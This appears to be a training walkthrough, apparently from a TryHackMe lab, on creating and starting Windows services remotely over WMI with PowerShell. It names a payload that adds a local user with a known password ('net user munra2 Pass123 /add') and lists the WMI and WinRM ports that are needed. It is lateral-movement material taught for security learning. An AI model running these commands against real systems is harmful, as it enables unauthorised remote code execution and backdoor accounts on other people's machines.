To create services remotely using WMI in PowerShell, follow these steps:

1. Assuming you have already established a WMI session and stored it in the `$Session` variable, you can use the following command to create a service:
   ```powershell
   Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
       Name = "THMService2"
       DisplayName = "THMService2"
       PathName = "net user munra2 Pass123 /add" # Your payload
       ServiceType = [byte]::Parse("16") # Win32OwnProcess: Start service in a new process
       StartMode = "Manual"
   }
   ```
   Replace `THMService2` with the desired service name and adjust the `PathName` parameter to specify the command or payload you want the service to execute.

2. To get a handle on the created service and start it, use the following commands:
   ```powershell
   $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name LIKE 'THMService2'"
   Invoke-CimMethod -InputObject $Service -MethodName StartService
   ```

3. Finally, to stop and delete the service, use the following commands:
   ```powershell
   Invoke-CimMethod -InputObject $Service -MethodName StopService
   Invoke-CimMethod -InputObject $Service -MethodName Delete
   ```

Make sure to adjust the commands and parameters according to your specific scenario. The required ports for WMI communication are 135/TCP, 49152-65535/TCP (DCERPC), and either 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS). The user account used for creating services remotely should have the necessary permissions, such as being a member of the Administrators group.